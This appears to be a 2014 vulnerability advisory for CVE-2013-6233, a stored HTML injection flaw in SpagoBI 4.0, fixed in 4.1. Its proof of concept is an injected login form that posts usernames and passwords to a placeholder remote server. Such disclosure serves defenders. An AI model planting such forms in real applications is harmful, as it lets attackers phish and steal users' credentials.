@@ -1,0 +1,120 @@
+###################################################
+
+01. ###  Advisory Information ###
+
+Title: Persistent HTML Script Insertion permits offsite-bound forms
+Date published: 2014-03-01
+Date of last update: 2014-03-01
+Vendors contacted: Engineering Group
+Discovered by: Christian Catalano
+Severity: Medium
+
+
+02. ###  Vulnerability Information ###
+
+CVE reference: CVE-2013-6233
+CVSS v2 Base Score: 4
+CVSS v2 Vector: (AV:N/AC:L/Au:S/C:N/I:P/A:N)
+Component/s: SpagoBI
+Class: Input Manipulation
+
+
+03. ### Introduction ###
+
+SpagoBI[1] is an Open Source Business Intelligence suite, belonging to 
+the free/open source SpagoWorld initiative, founded and supported by 
+Engineering Group[2].
+It offers a large range of analytical functions, a highly functional 
+semantic layer often absent in other open source platforms and projects, 
+and a respectable set of advanced data visualization features including 
+geospatial analytics.
+[3]SpagoBI is released under the Mozilla Public License, allowing its 
+commercial use. SpagoBI is hosted on OW2 Forge[4] managed by OW2 
+Consortium, an independent open-source software community.
+
+[1] - http://www.spagobi.org
+[2] - http://www.eng.it
+[3] - 
+http://www.spagoworld.org/xwiki/bin/view/SpagoBI/PressRoom?id=SpagoBI-ForresterWave-July2012
+[4] - http://forge.ow2.org/projects/spagobi
+
+
+04. ### Vulnerability Description ###
+
+SpagoBI contains a flaw that allows persistent  script insertion.
+This may allow a remote attacker to inject HTML code including forms 
+that load on a remote site, which can allow the attacker to conduct a 
+phishing attack on a user and capture their credentials.
+
+
+05. ### Technical Description / Proof of Concept Code ###
+
+The vulnerability is located in some SpagoBI input fields
+(e.g.'Description' input field from 'Short document metadata')
+
+To reproduce the vulnerability,  the attacker (a malicious user) can add 
+the malicious HTML script code:
+
+<form method="POST" action="http://server/login/login.php.">
+Username: <input type="text" name="username" size="15" /><br />
+Password: <input type="password" name="passwort" size="15" /><br />
+<div align="center">
+<p><input type="submit" value="Login" /></p>
+</div>
+</form>
+
+in 'Description' input field from 'Short document metadata' and click on 
+save button.
+The code execution happens when the victim (an unaware user)  click on 
+'Short document metadata'.
+
+This is not the only way to inject malicious HTML code in the SpagoBI 
+web app.
+
+
+06. ### Business Impact ###
+
+Exploitation of the vulnerability requires low privileged application 
+user account but low or medium user interaction.  Successful 
+exploitation of the vulnerability results in persistent  phishing and 
+persistent external redirects.
+
+
+07. ### Systems Affected ###
+
+This vulnerability was tested against: SpagoBI 4.0
+Older versions are probably affected too, but they were not checked.
+
+
+08. ### Vendor Information, Solutions and Workarounds ###
+
+This issue is fixed in SpagoBI v4.1, which can be downloaded from:
+http://forge.ow2.org/project/showfiles.php?group_id=204
+
+Fixed by vendor [verified]
+
+
+09. ### Credits ###
+
+This vulnerability has been discovered by:
+Christian Catalano aka wastasy ch(dot)catalano(at)gmail(dot)com
+
+
+10.  ### Vulnerability History ###
+
+October  08th, 2013: Vulnerability identification
+October  22th, 2013: Vendor notification to  [SpagoBI Team]
+November 05th, 2013: Vendor Response/Feedback  from  [SpagoBI Team]
+December 16th, 2013: Vendor Fix/Patch [SpagoBI Team]
+January  16th, 2014: Fix/Patch Verified
+March    01st, 2014: Vulnerability disclosure
+
+
+11. ### Disclaimer ###
+
+The information contained within this advisory is supplied "as-is" with
+no warranties or guarantees of fitness of use or otherwise.
+I accept no responsibility for any damage caused by the use or misuse of 
+this information.
+
+###################################################
